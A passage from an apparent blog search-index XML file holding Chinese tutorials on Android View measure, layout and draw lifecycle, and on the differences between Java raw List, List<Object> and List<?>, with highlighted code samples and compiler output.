class="line">    <span class="keyword">final</span> <span class="keyword">int</span> parentBottom = bottom - top - getPaddingBottomWithForeground();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">final</span> View child = getChildAt(i);</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> width = child.getMeasuredWidth();</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> height = child.getMeasuredHeight();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> childLeft;</span><br><span class="line">            <span class="keyword">int</span> childTop;</span><br><span class="line">      </span><br><span class="line">            <span class="keyword">switch</span> (verticalGravity) &#123;</span><br><span class="line">                <span class="keyword">case</span> Gravity.TOP:</span><br><span class="line">                    childTop = parentTop + lp.topMargin;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Gravity.CENTER_VERTICAL:</span><br><span class="line">                    childTop = parentTop + (parentBottom - parentTop - height) / <span class="number">2</span> +</span><br><span class="line">                    lp.topMargin - lp.bottomMargin;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Gravity.BOTTOM:</span><br><span class="line">                    childTop = parentBottom - height - lp.bottomMargin;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    childTop = parentTop + lp.topMargin;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            child.layout(childLeft, childTop, childLeft + width, childTop + height);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>省略了与获取布局属性相关的代码，可以看到：</p>
<ul>
<li>4-8行获取了父<code>View</code>的位置数据并在18-31行用于确定最终的位置数据</li>
<li>10-11行遍历了所有的子<code>View</code></li>
<li>12-13行获取了子<code>View</code>中在上一步骤的测量过程中储存的宽和高，并用于第33行中设置最终的右边界与下边界</li>
<li>第33行调用子<code>View</code>的<code>layout()</code>方法</li>
</ul>
]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title>Android View绘制（二）measure过程</title>
    <url>/2017/03/10/android_view_onMeasure/</url>
    <content><![CDATA[<p><a href="http://www.viseator.xyz/2017/03/09/android_view_lifeCycle/" target="_blank" rel="noopener">上一篇博客</a>简单地介绍了<code>View</code>绘制的生命周期， 从这篇博客开始将会对这个周期中一些有用的过程进行一个详细一些的介绍。这篇的主角就是在构造方法之后调用的<code>measure</code>过程。</p>
<p>为了演示，继承了<code>TextView</code>来实现一个自定义的<code>View</code>。注意这里继承的应该是<code>android.support.v7.widget.AppCompatTextView</code>这个类。同时为了<code>xml</code>文件的正常解析，我们需要实现<code>View</code>的三个构造方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">VView</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">VView</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(context, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">VView</span><span class="params">(Context context, AttributeSet attrs, <span class="keyword">int</span> defStyleAttr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(context, attrs, defStyleAttr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再通过完整包名的方法在<code>xml</code>布局文件中创建我们的<code>View</code>就可以直接显示了。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.viseator.viewtest.VView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"100dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"100dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:background</span>=<span class="string">"@color/Gray"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里给了<code>TextView</code>一个背景颜色便于后面的观察。</p>
<a id="more"></a>
<hr>
<p>下面就开始分析<code>measure</code>过程。</p>
<p><code>measure</code>是一个自顶向下的过程，即父<code>View</code>会依次调用它的子<code>View</code>的<code>measure()</code>方法来对它的子<code>View</code>进行测量。</p>
<p><code>View</code>的<code>measure()</code>方法最终会调用<code>onMeasure()</code>，真正的尺寸信息就是在<code>onMeasure()</code>方法中最终确定的。所以我们需要做的就是在自定义<code>View</code>中重写<code>onMeasure()</code>方法。</p>
<p>那么子<code>View</code>根据什么来确定自己应该具有的尺寸呢？当然不可能让子<code>View</code>自由地决定自己的大小，父<code>View</code>必然需要向子<code>View</code>传递信息来帮助子<code>View</code>来确定尺寸，而子<code>View</code>则必须满足父<code>View</code>的要求。查看<code>measure()</code>的方法签名：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">measure</span><span class="params">(<span class="keyword">int</span> widthMeasureSpec, <span class="keyword">int</span> heightMeasureSpec)</span></span></span><br></pre></td></tr></table></figure>
<p>这里的<code>widthMeasureSpec</code>与<code>heightMeasureSpec</code>就是存储这一信息的参数。它们的类型是<code>int</code>，内部以高两位来存储测量的模式，低三十位为测量的大小，计算中使用了位运算来提高并优化效率。当然我们不必使用位运算来获得对应的数值，<code>View.MeasureSpec</code>为我们提供了对应的方法。</p>
<p>测量模式有三种：</p>
<ul>
<li><code>EXACTLY</code>：精确值模式，即子<code>View</code>必须使用这一尺寸，并且保证它们的所有后代都在这个范围之内。当我们将控件的<code>layout_width</code>、<code>layout_height</code>属性指定为具体数值或<code>match_parent</code>时，系统使用这一模式。</li>
<li><code>UNSPECIFIED</code>：无限制模式，不对子<code>View</code>施加任何限制，完全由子<code>View</code>决定自己的大小。可以用于查看子<code>View</code>想要的尺寸，比如可以把子<code>View</code>的长度使用<code>EXACTLY</code>模式限制在100，不限制宽度来查看子<code>View</code>在长度为100情况想要的宽度。</li>
<li><code>AT_MOST</code>：最大值模式，只限制子<code>View</code>能具有的最大尺寸，子<code>View</code>必须保证它和它的后代们都在这一范围之内。</li>
</ul>
<p>了解这些，我们就可以通过重写<code>onMeasure()</code>来确定一个<code>View</code>的尺寸。</p>
<p>但在重写方法时要注意：必须调用<code>setMeasuredDimension()</code> 来将最终尺寸存储在<code>View</code>中，否则会抛出一个<code>IllegalStateException</code>。</p>
<p><code>xml</code>:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.viseator.viewtest.VView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"100dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:background</span>=<span class="string">"@color/Gray"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>VView</code>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onMeasure</span><span class="params">(<span class="keyword">int</span> widthMeasureSpec, <span class="keyword">int</span> heightMeasureSpec)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> widthMode = MeasureSpec.getMode(widthMeasureSpec);</span><br><span class="line">    <span class="keyword">int</span> heightMode = MeasureSpec.getMode(heightMeasureSpec);</span><br><span class="line">    <span class="keyword">int</span> width = MeasureSpec.getSize(widthMeasureSpec);</span><br><span class="line">    <span class="keyword">int</span> height = MeasureSpec.getSize(heightMeasureSpec);</span><br><span class="line">    Log.d(TAG, <span class="string">"widthMode: "</span> + widthMode);</span><br><span class="line">    Log.d(TAG, <span class="string">"heightMode: "</span> + heightMode);</span><br><span class="line">    Log.d(TAG, <span class="string">"width :"</span> + width);</span><br><span class="line">    Log.d(TAG, <span class="string">"height :"</span> + height);</span><br><span class="line">    <span class="keyword">super</span>.onMeasure(widthMeasureSpec, heightMeasureSpec);</span><br></pre></td></tr></table></figure>
<p>log:</p>
<p><img src="/images/onMeasureOutput1.png" alt="output"></p>
<p>这段简单的代码验证了之前的说法，分别对宽高设置了<code>wrap_content</code>和固定值，可以发现模式分别为<code>AT_MOST</code>与<code>EXACTLY</code>（以数值表示）。</p>
<p>这里输出的宽高值是以像素为单位的，可以看到高度的期望值就是设置的大小，但<code>wrap_content</code>期望的宽度值为1080（屏幕宽度），默认即为屏幕宽度，但最终计算得出的宽度值由于里面没有文字所以为0。</p>
<p>同样地，<code>UNSPECIFIED</code>模式给出的默认尺寸也是屏幕的宽/高。</p>
<p>所以我们可以看到如果想要实现<code>wrap_content</code>的效果，我们必须在<code>onMeasure</code>中对<code>AT_MOST</code>模式计算其内容宽/高并作为最终的宽/高，否则将以屏幕的宽/高进行填充。以<code>LinearLayout</code>的源码为例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (useLargestChild &amp;&amp;</span><br><span class="line">        (heightMode == MeasureSpec.AT_MOST || heightMode == MeasureSpec.UNSPECIFIED)) &#123;</span><br><span class="line">    mTotalLength = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; ++i) &#123;</span><br><span class="line">        <span class="keyword">final</span> View child = getVirtualChildAt(i);</span><br><span class="line">        <span class="keyword">if</span> (child == <span class="keyword">null</span>) &#123;</span><br><span class="line">            mTotalLength += measureNullChild(i);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (child.getVisibility() == GONE) &#123;</span><br><span class="line">            i += getChildrenSkipCount(child, i);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> LinearLayout.LayoutParams lp = (LinearLayout.LayoutParams)</span><br><span class="line">                child.getLayoutParams();</span><br><span class="line">        <span class="comment">// Account for negative margins</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> totalLength = mTotalLength;</span><br><span class="line">        mTotalLength = Math.max(totalLength, totalLength + largestChildHeight +</span><br><span class="line">                lp.topMargin + lp.bottomMargin + getNextLocationOffset(child));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add in our padding</span></span><br><span class="line">mTotalLength += mPaddingTop + mPaddingBottom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> heightSize = mTotalLength;</span><br></pre></td></tr></table></figure>
<p>这部分代码向我们展示了<code>LinearLayout</code>处理子<code>View</code>并计算所有的高度的情况。</p>
<p>知道了这个调用过程，我们就可以真正地进行<code>onMeasure()</code>的重写了。</p>
<p>例如可以暴力指定<code>View</code>尺寸：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onMeasure</span><span class="params">(<span class="keyword">int</span> widthMeasureSpec, <span class="keyword">int</span> heightMeasureSpec)</span> </span>&#123;</span><br><span class="line">    setMeasuredDimension(<span class="number">100</span>,<span class="number">600</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以为<code>AT_MOST</code>与<code>UNSPECIFIED</code>模式指定一个默认大小：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onMeasure</span><span class="params">(<span class="keyword">int</span> widthMeasureSpec, <span class="keyword">int</span> heightMeasureSpec)</span> </span>&#123;</span><br><span class="line">    setMeasuredDimension(measureSize(widthMeasureSpec), measureSize(heightMeasureSpec));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">measureSize</span><span class="params">(<span class="keyword">int</span> measureSpec)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mode = MeasureSpec.getMode(measureSpec);</span><br><span class="line">    <span class="keyword">int</span> size = MeasureSpec.getSize(measureSpec);</span><br><span class="line">    <span class="keyword">if</span> (mode == MeasureSpec.EXACTLY) &#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        size = <span class="number">300</span>; <span class="comment">//Default size</span></span><br><span class="line">        <span class="keyword">return</span> Math.min(size,MeasureSpec.getSize(measureSpec));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至于更复杂的计算逻辑由于本人能力有限就不写demo了，如果以后实际中遇到需要的时候再作补充。</p>
]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title>Android View绘制（一）生命周期总览</title>
    <url>/2017/03/09/android_view_lifeCycle/</url>
    <content><![CDATA[<p>为了直观表示整个过程，我制作了一张流程图。注意以下只是整个生命周期中比较常用的方法，并不代表所有的过程。</p>
<p><img src="/images/viewLifeCircle.png" alt="viewLifeCircle"></p>
<p>当一个<code>Activity</code>收到焦点即将要处于激活状态时，将会被要求绘制它的布局，绘制布局之前的过程在这里不涉及，我们从绘制<code>View</code>开始分析。</p>
<p>每个<code>Activity</code>被要求提供一个<code>ViewGroup</code>作为View树的根，也就是我们熟悉的<code>setContentView</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContentView</span><span class="params">(@LayoutRes <span class="keyword">int</span> layoutResID)</span> </span>&#123;</span><br><span class="line">    getDelegate().setContentView(layoutResID);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContentView</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">    getDelegate().setContentView(view);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContentView</span><span class="params">(View view, ViewGroup.LayoutParams params)</span> </span>&#123;</span><br><span class="line">    getDelegate().setContentView(view, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>setContentView</code>拥有三种形式，可以直接传入<code>View</code>、传入一个<code>layout</code>资源文件，或传入一个<code>View</code>文件和一个用于提供参数的<code>LayoutParams</code>对象。</p>
<p>整个过程将从这个根<code>View</code>开始，并遍历它的子<code>View</code>来逐一绘制，每个<code>ViewGroup</code>承担了要求它的子<code>View</code>进行绘制的责任，每个<code>View</code>承担了绘制自身的责任。并且父<code>View</code>会在子<code>View</code>完成绘制之前进行绘制，同级的<code>View</code>将以它们出现在树中的顺序进行绘制。</p>
<a id="more"></a>
<hr>
<p>首先调用的当然是<code>View</code>的构造函数，构造函数分为两种，一种供代码创建的<code>View</code>使用，另一种是由<code>layout</code>文件生成的<code>View</code>使用，区别在于后者会从<code>layout</code>文件中读入所有的属性，前者的属性则需要在代码中设置。</p>
<p>另外后者在所有的子<code>View</code>都生成完毕之后会回调<code>onFinishInflate</code>方法。</p>
<hr>
<p>在正式绘制之前要进行两个过程（布局机制[layout mechanism]）：</p>
<p>首先是<code>measure</code>过程。这是一个自顶向下的过程，父<code>View</code>将期望尺寸传递给子<code>View</code>，子<code>View</code>需要根据这一信息确定自己的尺寸，并且保证这一尺寸满足父<code>View</code>对其的要求，在子<code>View</code>确定自己尺寸的过程中也要向它的子<code>View</code>传递信息，就这样递归地确定自己的尺寸信息并储存在自身中，保证在<code>measure</code>方法返回时，自身的尺寸信息已经确定。所以在根<code>View</code>的<code>measure</code>方法返回时，所有子<code>View</code>的尺寸信息已经全部确定了。</p>
<p>这个过程需要注意一个<code>View</code>可能不止一次地调用<code>measure</code>方法来对子<code>View</code>进行测量。比如，可能要先传递一个无限制的信息来获取子<code>View</code>想要的尺寸，当子<code>View</code>希望的尺寸过大或过小时，父<code>View</code>需要再次调用<code>measure</code>方法来给予子<code>View</code>一些限制。</p>
<p>第二个是<code>layout</code>过程，这也是一个自顶向下的遍历过程，在这个过程中父<code>View</code>负责按照上一个过程中计算并储存在<code>View</code>中的尺寸信息来正确地放置子<code>View</code>。</p>
<p>同时这个过程可以通过调用<code>requestLayout()</code>来重新进行，并且会引起后面步骤的执行，相当于对以这个<code>View</code>为根的<code>View</code>树进行重新布局。</p>
<hr>
<p>下面就是真正的绘制过程了，也就是<code>View</code>的<code>draw()</code>方法，在<code>draw()</code>方法中，（如果需要）会<strong>依次</strong>调用如下方法：</p>
<ol>
<li><code>drawBackground()</code>：在画布上绘制特定的背景</li>
<li><code>onDraw()</code>：重写<code>View</code>几乎必重写的一个方法，用于绘制图形</li>
<li><code>dispatchDraw()</code>：<code>ViewGroup</code>会重写这个方法，用于对所有的子<code>View</code>调用<code>draw()</code>方法进行绘制</li>
<li><code>onDrawForeground()</code>：用于绘制前景（如果需要）</li>
</ol>
<p>可以看到如果需要调用上述的方法必定会按照这个顺序进行，也就是说，子<code>View</code>的绘制是在父<code>View</code>绘制之后进行的，而同级<code>View</code>的绘制是根据<code>View</code>在父<code>View</code>中的顺序进行绘制的。</p>
<p>同时这个过程可以通过调用<code>invalidate()</code>来重新进行，相当于进行某个<code>View</code>的重绘。</p>
]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
        <tag>LifeCycle</tag>
      </tags>
  </entry>
  <entry>
    <title>Java泛型中List、List&amp;lt;Object&amp;gt;、List&amp;lt;?&amp;gt;的区别</title>
    <url>/2017/02/14/DiffInGeneric/</url>
    <content><![CDATA[<p>Java 1.5中引入了泛型的概念以增加代码的安全性与清晰度，同时为了提供对旧代码的兼容性，让旧代码不经过改动也可以在新版本中运行，Java提供了原生态类型（或称原始类型）。但是实际中在新的代码中已经不应该使用原生态类型。</p>
<p>原生态类型的含义是不带任何实际参数的泛型名称，例如Java 1.5后改为泛型实现的<code>List&lt;E&gt;</code>，<code>List</code>就是它的原生态类型，与没有引入泛型之前的类型完全一致。</p>
<p>而在虚拟机层面上，是没有泛型这一概念的——所有对象都属于普通类。在编译时，所有的泛型类都会被视为原生态类型。</p>
<p>那么为什么不应该使用原生态类型呢？</p>
<blockquote>
<p>  如果使用原生态类型，就失掉了泛型在安全性和表述性方面的所有优势。——Effective Java</p>
</blockquote>
<p>泛型的目的简单地说就是可以让一些运行时才能发现的错误可以在编译期间就可以被编译器所检测出，运行时出问题的代价与编译期出现问题的代价的差别可想而知。换句话说，泛型是编译器的一种及时发现错误的机制，同时也给用户带来了代码的清晰与简洁的附加好处（不必再写一些复杂而危险并且不直观的强制类型转换）。</p>
<p>下面就进入正题谈谈以<code>List</code>为例时<code>List</code>、<code>List&lt;Object&gt;</code>、<code>List&lt;?&gt;</code>的区别。</p>
<p>先下定义：</p>
<ul>
<li><code>List</code>：<strong>原生态类型</strong></li>
<li><code>List&lt;Object&gt;</code>：<strong>参数化的类型</strong>，表明<code>List</code>中可以<strong>容纳</strong>任意类型的对象</li>
<li><code>List&lt;?&gt;</code>：<strong>无限定通配符类型</strong>，表示<strong>只能包含某一种未知对象类型</strong><a id="more"></a>
</li>
</ul>
<p>下面看一段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DiffInGeneric</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; strings = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        List list = strings;<span class="comment">//ok</span></span><br><span class="line">        List&lt;Object&gt; objects = strings;<span class="comment">//Error: java: incompatible types: java.util.List&lt;java.lang.String&gt; cannot be converted to java.util.List&lt;java.lang.Object&gt;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们创建了一个<code>List&lt;String&gt;</code>类型的对象<code>strings</code>，再把它赋给原生态类型<code>List</code>，这是可以的。但是第5行中尝试把它传递给<code>List&lt;Object&gt;</code>时，出现了一个类型不相容错误，注意，这是一个编译期错误。</p>
<p>这是因为泛型有子类型化的规则：</p>
<p><code>List&lt;String&gt;</code>是原生态类型<code>List</code>的一个子类型。虽然<code>String</code>是<code>Object</code>的子类型，但是由于<strong>泛型是不可协变的</strong>，<code>List&lt;String&gt;</code>并不是<code>List&lt;Object&gt;</code>的子类型，所以这里的传递无法通过编译。</p>
<p>如果像上面那样使用原生态类型会有什么隐患呢？看下面一段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DiffInGeneric</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; strings = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        unsafeAdd(strings, (Integer)<span class="number">1</span>);</span><br><span class="line">        System.out.println(strings.get(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unsafeAdd</span><span class="params">(List list, Object object)</span> </span>&#123;</span><br><span class="line">        list.add(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译器提示了两条警告：</p>
<p>第8行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">warning: [rawtypes] found raw type: List</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unsafeAdd</span><span class="params">(List list, Object object)</span> </span>&#123;</span><br><span class="line">                                  ^</span><br><span class="line">  missing type arguments <span class="keyword">for</span> generic <span class="class"><span class="keyword">class</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line">  where E is a type-variable:</span><br><span class="line">    E extends Object declared in <span class="class"><span class="keyword">interface</span> <span class="title">List</span></span></span><br></pre></td></tr></table></figure>
<p>警告发现了原生态类型<code>List</code>，同时还贴心地指出了<code>List&lt;E&gt;</code>的形式以及<code>E</code>的来源。</p>
<p>第9行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">warning: [unchecked] <span class="function">unchecked call to <span class="title">add</span><span class="params">(E)</span> as a member of the raw type List</span></span><br><span class="line"><span class="function">        list.<span class="title">add</span><span class="params">(object)</span></span>;</span><br><span class="line">                ^</span><br><span class="line">  where E is a type-variable:</span><br><span class="line">    E extends Object declared in <span class="class"><span class="keyword">interface</span> <span class="title">List</span></span></span><br></pre></td></tr></table></figure>
<p>同样指出了我们正在把一个对象添加到<code>List</code>中，而这个添加过程由于我们使用了原生态类型而无法被检验。</p>
<p>如果忽略这两条警告并运行这个程序，显然会出现一条错误：</p>
<p>第5行： </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String</span><br></pre></td></tr></table></figure>
<p>我们试图把一个自动装箱后的<code>Integer</code>对象插入到了一个被声明为<code>List&lt;String&gt;</code>的<code>List</code>中，由于我们在<code>unsafeAdd</code>方法中使用了原生态类型，从而使得编译器无法在编译期间检查<code>add</code>参数的合法性，从而没有产生编译错误而是产生了一条警告，运行后当试图把这个错误的<code>Integer</code>对象作为<code>String</code>取出时就会出现<code>ClassCaseException</code>异常，这是个运行时的异常，导致了程序中断。</p>
<p>如果我们把<code>unsafeAdd</code>方法的参数从<code>List</code>改为<code>List&lt;Object&gt;</code>会发生什么呢？正如之前所说的那样，由于<code>List&lt;String&gt;</code>并不是<code>List&lt;Object&gt;</code>的子类型，所以在传递参数的时候就会出现第一段代码中出现的<strong>编译期错误</strong>。这体现了泛型所带来的安全性。</p>
<p>可以这么说，<code>List&lt;Object&gt;</code>唯一特殊的地方只是<code>Object</code>是所有类型的超类，由于泛型的不可协变性，<strong>它只能表示<code>List</code>中可以容纳所有类型的对象，却不能表示任何参数类型的<code>List&lt;E&gt;</code>。</strong></p>
<p>而<code>List&lt;?&gt;</code>则是通配符类型中的一种特例，它并没有<code>extend</code>或<code>super</code>这样的限制，从而可以做到引用任意参数类型的<code>List&lt;E&gt;</code>。但由于没有表示类型的符号（<code>E</code>），在方法中无法引用这个类型，所以它只用于无需使用具体类型的方法之中，如果不是这个情况，则需要使用泛型方法（只用<code>List&lt;?&gt;</code>的<strong>不是</strong>一个泛型方法，它具有<code>List&lt;?&gt;</code>这个固定的参数`）。</p>
<p>但是<code>List&lt;?&gt;</code>还是不能用作上面的<code>unsafeAdd</code>的参数，修改后会出现一条奇怪的编译错误：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">error: <span class="function">no suitable method found <span class="keyword">for</span> <span class="title">add</span><span class="params">(Object)</span></span></span><br><span class="line"><span class="function">        list.<span class="title">add</span><span class="params">(object)</span></span>;</span><br><span class="line">            ^</span><br><span class="line">    method Collection.add(CAP#1) is not applicable</span><br><span class="line">      (argument mismatch; Object cannot be converted to CAP#1)</span><br><span class="line">    method List.add(CAP#1) is not applicable</span><br><span class="line">      (argument mismatch; Object cannot be converted to CAP#1)</span><br><span class="line">  where CAP#1 is a fresh type-variable:</span><br><span class="line">    CAP#1 extends Object from capture of ?</span><br></pre></td></tr></table></figure>
<p>这是因为无法将任何元素（<code>null</code>除外）放入<code>List&lt;?&gt;</code>中。这又是为什么呢？先来看一个有限定通配符的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DiffInGeneric</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        List&lt;? extends Number&gt; numbers = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        numbers= <span class="keyword">new</span> ArrayList&lt;Double&gt;();</span><br><span class="line">        numbers= <span class="keyword">new</span> ArrayList&lt;Float&gt;();</span><br><span class="line">        numbers = <span class="keyword">new</span> ArrayList&lt;Number&gt;();</span><br><span class="line">        numbers.add(<span class="keyword">new</span> Integer(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第7行报出了与之前相似的编译错误：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">error: <span class="function">no suitable method found <span class="keyword">for</span> <span class="title">add</span><span class="params">(Integer)</span></span></span><br><span class="line"><span class="function">        numbers.<span class="title">add</span><span class="params">(new Integer(<span class="number">1</span>)</span>)</span>;</span><br><span class="line">               ^</span><br><span class="line">    method Collection.add(CAP#1) is not applicable</span><br><span class="line">      (argument mismatch; Integer cannot be converted to CAP#1)</span><br><span class="line">    method List.add(CAP#1) is not applicable</span><br><span class="line">      (argument mismatch; Integer cannot be converted to CAP#1)</span><br><span class="line">  where CAP#1 is a fresh type-variable:</span><br><span class="line">    CAP#1 extends Number from capture of ? extends Number</span><br></pre></td></tr></table></figure>
<p>这次我们可以看出错误的原因：可以将一个<code>List&lt;Integer&gt;</code>传递给<code>List&lt;? extends Number&gt;</code>，因为<code>Integer</code>是<code>Number</code>的子类，符合限定符的条件。同理，也可以将类似的对象传递给它，当然也可以把<code>List&lt;Number&gt;</code>传递给它。</p>
<p>如果允许这个对象的<code>add</code>操作，我们无法知道这个参数是否与对象的泛型参数相同，因为我们只知道它是<code>Number</code>的一个子类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;? extends Parent&gt; list = <span class="keyword">new</span> ArrayList&lt;Child&gt;();</span><br><span class="line">List&lt;? extends Parent&gt; parents = list;</span><br><span class="line">list.add(<span class="keyword">new</span> Parent());</span><br></pre></td></tr></table></figure>
<p>上面的1,2两行是完全合法的，如果允许第3行的<code>add</code>操作，那么会把一个<code>Parent</code>对象加入到一个实际类型是<code>Child</code>的<code>List</code>中，而<code>Parent</code>is-not-a <code>Child</code>，这破坏了Java的类型安全，是绝对不允许的。</p>
<p>上面是有限制通配符的情况，那么针对<code>List&lt;?&gt;</code>这样的无限制通配符更是如此。因此，为了保证类型安全，不允许对<code>List&lt;?&gt;</code>或<code>List&lt;? extends E&gt;</code>这样的通配符类型进行类似<code>add</code>的操作。</p>
<p>使用泛型方法可以避免这个问题（重申通配符类型并不是泛型方法），使用无限制通配符类型可以取代其他需要表示<strong>包含某一种对象类型的泛型类型</strong>的情况而不是使用原生态类型<code>List</code>。</p>
